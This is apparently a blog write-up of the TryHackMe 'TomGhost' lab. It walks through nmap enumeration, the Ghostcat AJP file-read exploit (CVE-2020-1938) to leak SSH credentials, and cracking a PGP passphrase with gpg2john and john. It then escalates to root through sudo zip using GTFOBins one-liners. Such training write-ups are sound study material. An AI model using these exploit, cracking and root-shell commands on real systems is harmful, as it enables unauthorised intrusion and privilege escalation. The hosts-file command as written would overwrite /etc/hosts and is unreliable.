---
layout: post
title: "THM Writeup - TomGhost"
subtitle: "Try Hack Me - TomGhost"
date: 2021-07-08 
background: '/img/bg-write.jpg'
---

# THM ![Try Hack Me](https://img.shields.io/badge/-TryHackMe-black?style=flat-square&logo=tryhackme)

## Room name: TomGhost
<https://tryhackme.com/room/tomghost>

### Description: 
Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.

### OS: ![Linux](https://img.shields.io/badge/Linux-black?style=flat-square&logo=linux)


### Enumeration
As I will be leveraging the built in THM Attack Box, I like to prepare by setting up the environment to ensure consistency. I plan to script some of this in the near future for ease of use.
Firstly, I will create the **scans** directory for NMAP.

Optional: for added convenience, one may choose to add the ip to the local hosts file.

```bash
echo "127.0.0.1 tom" > /etc/hosts
```

To begin enumeration, a simple nmap scan to enumerate open ports, services, and versions:

```bash
nmap -sC -sV -A -oN scans/nmap.initial $IP
```
The following ports are open on the machine:

port 	   |service
-----------|----------
22         |ssh
53		   |tcpwrapped
8009	   |Apache Jserv
8080       |Apache Tomcat

Visiting the website at port 8080 reveals the default Apache tomcat help page. After looking around for clues and attempting to log in, I decided to move on to the other ports and services. 

Looking at the service on 8009 and searching Exploit DB, we run across the following exploit:
- https://www.exploit-db.com/exploits/48143

The National Vulnerability database also includes the entry:
- nvd.nist.gov/vuln/detail/CVE-2020-1938

In addition, running searchsploit for ajp reveals the following (our target is the 48143.py file):

```bash
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
AjPortal2Php - 'PagePrefix' Remote File Inclu | php/webapps/3752.txt
Apache Tomcat - AJP 'Ghostcat' File Read/Inclu | multiple/webapps/48143.py
---------------------------------------------- ---------------------------------
```


## User Flag:
The python exploit is fairly straightforward and only requires the $IP of the target system.
Running the exploit (python 48143.py $IP), we are able to reveal the following:
```bash
<description>
    Welcome to GhostCat
        s***k:8****ks
</description>    
```
This confirms the credentials for one user. We can then attempt to SSH into the server with this login information.
<br>
After we successfully ssh into the server, listing directory contents presents us with the following PGP keychanin files. We also use this time to check the user privilege level.
```bash
s***k@ubuntu:~$ ls
credential.pgp  tryhackme.asc

s***k@ubuntu:~$ id
uid=1002(s***k) gid=1002(s***k) groups=1002(s***k)
```
As a standard, we search the machine for the user flag (user.txt) and redirect any failed output to dev/null. This reveals the location of the flag in the home directory of user: merlin. we then view the contents of the file to receive the user flag.
```bash
s***k@ubuntu:~$ find / -type f -name user.txt 2>/dev/null
/home/merlin/user.txt
s***k@ubuntu:~$ cat /home/merlin/user.txt
THM{G**********y}
```

## Root Flag
Now that we have a user shell and have located the user flag, we can go back to the PGP files we located earlier. For ease of manipulation, we can move these files to our attack machine.
```bash
root@ip-10-10-44-243:~# scp s***k@$IP:/home/s***k/* .
s***k@$IP password: 
credential.pgp                  100%  394   204.1KB/s   00:00    
tryhackme.asc                   100% 5144     4.1MB/s   00:00
```

Now, with the files available, we can leverage gpg2john to reveal the hash in the tryhackme.asc file. From there, we can then use john to crack the password hash.

Run:
> gpg2john tryhackme.asc > hash.txt

Then we run the following using the rockyou wordlist:
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```bash
Press 'q' or Ctrl-C to abort, almost any other key for status
a****u        (tryhackme)
1g 0:00:00:00 DONE (2021-07-08 20:38)
```

Now we have received the password from the file, we can decrypt the .GPG file. In order to do so we will need to import the gpg file, then decrpt as follows:
>gpg --import tryhackme.asc<br>
>gpg --decrypt credential.pgp

Upon running the commands and entering the password gained in the previous step, we are presented with the password for the user: **merlin**.

>merlin:a**********************j

Using these creds, we can now SSH into the server as merlin and move on.

After logging in as merlin, to further pivot, we review what, if any SUDO permissions are available for use. To do so we run *sudo -l* to enumerate. We see that merlin may run Zip as root. 

```bash
User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```
This being the case, we search to identify a potential Zip privilige escalation. We check GTFObins (<https://gtfobins.github.io/gtfobins/zip/#sudo>) for a possible option and find that we can get a root shell with the following command.  
```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF

** Alternative **
sudo zip 1.zip a -T --unzip-command="sh -c /bin/bash"
```
We now have a shell running as root.
```bash
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
```
From here we run find to simply locate root.txt and examine the output to get our final flag.
```bash
root@ubuntu:~# find / -type f -name root.txt 2>/dev/null
/root/root.txt
root@ubuntu:~# cat /root/root.txt
THM{Z**********E}
```

## Takeaways

1. Basic enumeration with nmap
2. Exploit DB search and POC identification
3. John the ripper (gpg2john) on pgp files
4. GTFObins for Zip
